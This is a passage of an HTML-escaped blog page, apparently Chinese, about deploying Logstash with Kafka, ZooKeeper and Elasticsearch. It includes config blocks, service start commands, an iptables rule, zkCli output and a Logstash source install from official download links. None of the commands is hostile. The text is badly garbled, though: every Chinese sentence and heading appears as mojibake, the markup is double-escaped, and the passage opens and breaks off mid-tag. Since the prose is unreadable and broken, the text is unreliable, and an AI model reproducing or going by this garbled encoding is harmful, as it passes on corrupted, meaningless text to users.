&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                zk_connect =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181/kafka&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                group_id =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;logstash&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                topic_id =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;logstash&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                reset_beginning =&amp;gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# boolean (optional)ï¼Œ default: false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                consumer_threads =&amp;gt; 2  &lt;span class=&quot;comment&quot;&gt;# number (optional)ï¼Œ default: 1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                decorate_events =&amp;gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# boolean (optional)ï¼Œ default: false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  output &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    elasticsearch &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      hosts =&amp;gt; [&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.206:9200&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.188:9200&quot;&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      index =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;%&amp;#123;host&amp;#125;-%&amp;#123;+YYYY.MM.dd&amp;#125;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   &lt;span class=&quot;comment&quot;&gt;# stdout &amp;#123; codec =&amp;gt; rubydebug &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ–°å»ºäº†ä¸ªæµ‹è¯•çš„ï¼Œæµ‹è¯•ä¸‹å‘é€æ˜¯å¦æˆåŠŸï¼š/usr/local/logstash/config/stdin_to_es.conf &lt;/p&gt;
&lt;figure class=&quot;highlight puppet&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;input&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; stdin &amp;#123;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;output&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    elasticsearch &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;attr&quot;&gt;hosts&lt;/span&gt; =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;10.47.88.206&quot;&lt;/span&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;stdout&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;attr&quot;&gt;codec&lt;/span&gt; =&amp;gt; rubydebug &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;Step-2-å¯åŠ¨æœåŠ¡&quot;&gt;&lt;a href=&quot;#Step-2-å¯åŠ¨æœåŠ¡&quot; class=&quot;headerlink&quot; title=&quot;Step 2: å¯åŠ¨æœåŠ¡&quot;&gt;&lt;/a&gt;Step 2: å¯åŠ¨æœåŠ¡&lt;/h3&gt;&lt;figure class=&quot;highlight dts&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Kafkaç”¨åˆ°äº†Zookeeperï¼Œæ‰€æœ‰é¦–å…ˆå¯åŠ¨Zookperï¼Œä¸‹é¢ç®€å•çš„å¯ç”¨ä¸€ä¸ªå•å®ä¾‹çš„ZookkeeperæœåŠ¡ã€‚å¯ä»¥åœ¨å‘½ä»¤çš„ç»“å°¾åŠ ä¸ª&amp;amp;ç¬¦å·ï¼Œè¿™æ ·å°±å¯ä»¥å¯åŠ¨åç¦»å¼€æ§åˆ¶å°ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#ç°åœ¨å¯åŠ¨Kafka:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta-keyword&quot;&gt;/srv/&lt;/span&gt;kafka&lt;span class=&quot;meta-keyword&quot;&gt;/bin/&lt;/span&gt;kafka-server-start.sh -daemon config/server.properties&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#æ·»åŠ å¼€æœºå¯åŠ¨&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;echo â€˜&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;# start kafka&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta-keyword&quot;&gt;/usr/&lt;/span&gt;local&lt;span class=&quot;meta-keyword&quot;&gt;/kafka/&lt;/span&gt;bin/kafka-server-start.sh -daemon &lt;span class=&quot;meta-keyword&quot;&gt;/usr/&lt;/span&gt;local&lt;span class=&quot;meta-keyword&quot;&gt;/kafka/&lt;/span&gt;config/server.properties&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;â€˜ &amp;gt;&amp;gt; &lt;span class=&quot;meta-keyword&quot;&gt;/etc/&lt;/span&gt;rc.local&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#å…³é—­&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta-keyword&quot;&gt;/usr/&lt;/span&gt;local&lt;span class=&quot;meta-keyword&quot;&gt;/kafka/&lt;/span&gt;bin/kafka-server-stop.sh&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;kafkaé…ç½®é˜²ç«å¢™ï¼š&quot;&gt;&lt;a href=&quot;#kafkaé…ç½®é˜²ç«å¢™ï¼š&quot; class=&quot;headerlink&quot; title=&quot;kafkaé…ç½®é˜²ç«å¢™ï¼š&quot;&gt;&lt;/a&gt;kafkaé…ç½®é˜²ç«å¢™ï¼š&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;-A INPUT -i eth0 -p tcp -m state --state NEW -m tcp --dport 4888 -j ACCEPT&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;zookeeperé›†ç¾¤&quot;&gt;&lt;a href=&quot;#zookeeperé›†ç¾¤&quot; class=&quot;headerlink&quot; title=&quot;zookeeperé›†ç¾¤&quot;&gt;&lt;/a&gt;zookeeperé›†ç¾¤&lt;/h3&gt;&lt;p&gt;æŸ¥çœ‹æˆ‘ä¹‹å‰å†™çš„è¿™ç¯‡æ–‡æ¡£ &lt;a href=&quot;http://blog.yangcvo.me/2016/05/28/%E5%A4%A7%E6%95%B0%E6%8D%AEhadoop/zookeeper/ZooKeeper%E9%9B%86%E7%BE%A4%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BC%98%E5%8C%96/&quot;&gt;ZooKeeperçš„é›†ç¾¤å¿«é€Ÿæ­å»ºä¸ä¼˜åŒ–&lt;/a&gt; &lt;/p&gt;
&lt;h3 id=&quot;èµ°kafkaæŸ¥çœ‹æ˜¯å¦æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯åŠ¨ï¼š&quot;&gt;&lt;a href=&quot;#èµ°kafkaæŸ¥çœ‹æ˜¯å¦æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯åŠ¨ï¼š&quot; class=&quot;headerlink&quot; title=&quot;èµ°kafkaæŸ¥çœ‹æ˜¯å¦æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯åŠ¨ï¼š&quot;&gt;&lt;/a&gt;èµ°kafkaæŸ¥çœ‹æ˜¯å¦æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯åŠ¨ï¼š&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@kafka_03 bin]&lt;span class=&quot;comment&quot;&gt;# sh zkCli.sh&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Connecting to localhost:2181&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2017-01-04 19:20:24,849 [myid:] - INFO  [main:Environment@100] - Client environment:zookeeper.version=3.4.6-1569965, built on 02/20/2014 09:09 GMT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2017-01-04 19:20:24,853 [myid:] - INFO  [main:Environment@100] - Client environment:host.name=kafka_03&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2017-01-04 19:20:24,853 [myid:] - INFO  [main:Environment@100] - Client environment:java.version=1.8.0_66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2017-01-04 19:20:24,856 [myid:] - INFO  [main:Environment@100] - Client environment:java.vendor=Oracle Corporation&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2017-01-04 19:20:24,856 [myid:] - INFO  [main:Environment@100] - Client environment:java.home=/srv/jdk1.8.0_66/jre&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2017-01-04 19:20:24,856 [myid:] - INFO  [main:Environment@100] - Client environment:java.class.path=/srv/zookeeper-3.4.6/bin/../build/classes:/srv/zookeeper-3.4.6/bin/../build/lib/*.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-log4j12-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-api-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/netty-3.7.0.Final.jar:/srv/zookeeper-3.4.6/bin/../lib/&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;4j-1.2.16.jar:/srv/zookeeper-3.4.6/bin/../lib/jline-0.9.94.jar:/srv/zookeeper-3.4.6/bin/../zookeeper-3.4.6.jar:/srv/zookeeper-3.4.6/bin/../src/java/lib/*.jar:/srv/zookeeper-3.4.6/bin/../conf:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2017-01-04 19:20:24,856 [myid:] - INFO  [main:Environment@100] - Client environment:java.library.path=/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[zk: localhost:2181(CONNECTED) 0] ls /&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[controller_epoch, brokers, zookeeper, kafka, dubbo, admin, isr_change_notification, consumers, config, sthp]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[zk: localhost:2181(CONNECTED) 5] ls /kafka/brokers/ids&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[0, 1, 2]&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;kafka ä¸‰å°é›†ç¾¤è¿™é‡Œå¯ä»¥çœ‹åˆ°è·å–åˆ°idsã€‚&lt;/p&gt;
&lt;h4 id=&quot;å®‰å…¨é—®é¢˜&quot;&gt;&lt;a href=&quot;#å®‰å…¨é—®é¢˜&quot; class=&quot;headerlink&quot; title=&quot;å®‰å…¨é—®é¢˜&quot;&gt;&lt;/a&gt;å®‰å…¨é—®é¢˜&lt;/h4&gt;&lt;p&gt;ç‰¹åˆ«è¦æ³¨æ„elkæ‰€æœ‰è½¯ä»¶çš„ç«¯å£ç›‘å¬,åˆ‡å‹¿æš´éœ²ç›‘å¬åˆ°å…¬ç½‘ä¸Šå»,å¦å¤–å³ä¾¿æ˜¯å†…ç½‘ä½ ä¹Ÿå¾—æ³¨æ„é…ç½®å†…ç½‘çš„è®¿é—®é™åˆ¶ã€‚&lt;/p&gt;
&lt;h3 id=&quot;logstash-å®¢æˆ·ç«¯å®‰è£…ï¼š&quot;&gt;&lt;a href=&quot;#logstash-å®¢æˆ·ç«¯å®‰è£…ï¼š&quot; class=&quot;headerlink&quot; title=&quot;logstash å®¢æˆ·ç«¯å®‰è£…ï¼š&quot;&gt;&lt;/a&gt;logstash å®¢æˆ·ç«¯å®‰è£…ï¼š&lt;/h3&gt;&lt;h5 id=&quot;æºç å®‰è£…&quot;&gt;&lt;a href=&quot;#æºç å®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;æºç å®‰è£…&quot;&gt;&lt;/a&gt;æºç å®‰è£…&lt;/h5&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;æˆ‘è¿™é‡Œæºç åŒ…å®‰è£…&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# wget https://download.elasticsearch.org/logstash/logstash/logstash-2.4.0.tar.gz&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#curl -O https://download.elastic.co/logstash/logstash/logstash-2.4.0.tar.gz&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#tar -zxvf logstash-2.4.0.tar.gz&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#mv logstash-2.4.0 /usr/local/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ln -s /usr/local/logstash-2.4.0/ /usr/local/logstash&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ä¸‹è½½å¯åŠ¨è„šæœ¬&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ç”Ÿäº§éƒ½æ˜¯è¿è¡Œåœ¨åå°çš„ï¼Œæˆ‘è¿™é‡Œæºç å®‰è£…æ²¡æœ‰initè„šæœ¬å¯åŠ¨ã€‚ å»Githubä¸‹è½½  https://github.com/benet1006/ELK_config.git&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#cp logstash.init /etc/init.d/logstash&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#chmod +x /etc/init.d/logstash&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;è¿™ä¸ªè„šæœ¬æˆ‘åšè¿‡ä¿®æ”¹ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#å¯åŠ¨logstashæœåŠ¡&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;service logstash start&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;service logstash status&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#æŸ¥çœ‹5000ç«¯å£&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;netstat -nltp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Active Internet connections (only servers)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp 0 0 0.0.0.0:9200 0.0.0.0:* LISTEN 1765/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp 0 0 0.0.0.0:9300 0.0.0.0:* LISTEN 1765/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp 0 0 0.0.0.0:9301 0.0.0.0:* LISTEN 2309/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1509/sshd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 1876/node&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 2309/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp 0 0 :::22 :::* LISTEN 1509/sshd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ä¿®æ”¹å¯åŠ¨è„šæœ¬&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;vim /etc/init.d/logstash &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æŒ‡å®šçš„ç›®å½•è‡ªå·±æºç å®‰è£…çš„è·¯å¾„ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;name=logstash&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pidfile=&lt;span class=&quot;string&quot;&gt;&quot;/var/run/&lt;span class=&quot;variable&quot;&gt;$name&lt;/span&gt;.pid&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; CLASSPATH=.:&lt;span class=&quot;variable&quot;&gt;$JAVA_HOME&lt;/span&gt;/jre/lib/rt.jar:&lt;span class=&quot;variable&quot;&gt;$JAVA_HOME&lt;/span&gt;/lib/dt.jar:&lt;span class=&quot;variable&quot;&gt;$JAVA_HOME&lt;/span&gt;/lib/tools.jar&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; PATH=&lt;span class=&quot;variable&quot;&gt;$PATH&lt;/span&gt;:&lt;span class=&quot;variable&quot;&gt;$JAVA_HOME&lt;/span&gt;/bin&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_USER=logstash&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_GROUP=logstash&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_HOME=/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/logstash å®‰è£…è·¯å¾„&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_HEAP_SIZE=&lt;span class=&quot;string&quot;&gt;&quot;1000m&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_JAVA_OPTS=&lt;span class=&quot;string&quot;&gt;&quot;-Djava.io.tmpdir=&lt;span class=&quot;variable&quot;&gt;$&amp;#123;LS_HOME&amp;#125;&lt;/span&gt;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_LOG_DIR=/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/logstash&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_LOG_FILE=&lt;span class=&quot;string&quot;&gt;&quot;&lt;span class=&quot;variable&quot;&gt;$&amp;#123;LS_LOG_DIR&amp;#125;&lt;/span&gt;/&lt;span class=&quot;variable&quot;&gt;$name&lt;/span&gt;.log&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_CONF_FILE=/etc/logstash.conf     æ”¶é›†æ—¥å¿—çš„è§„åˆ™conf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_OPEN_FILES=16384&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_NICE=19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LS_OPTS=&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;https://www.elastic.co/guide/en/logstash/current/plugins-inputs-file.html&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;è¿™ä¸ªæ˜¯&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt; stashçš„å®˜æ–¹æ–‡æ¡£çš„é…ç½®è¯´æ˜ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;è¿™ä¸ªé…ç½®è¯´æ˜ä¸Šé¢æˆ‘å…ˆä¿®æ”¹ä¸‹æˆ‘ä¹‹å‰çš„é…ç½®æ–‡ä»¶ã€‚&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;logstash-agenté…ç½®ï¼š&quot;&gt;&lt;a href=&quot;#logstash-agenté…ç½®ï¼š&quot; class=&quot;headerlink&quot; title=&quot;logstash agenté…ç½®ï¼š&quot;&gt;&lt;/a&gt;logstash agenté…ç½®ï¼š&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div 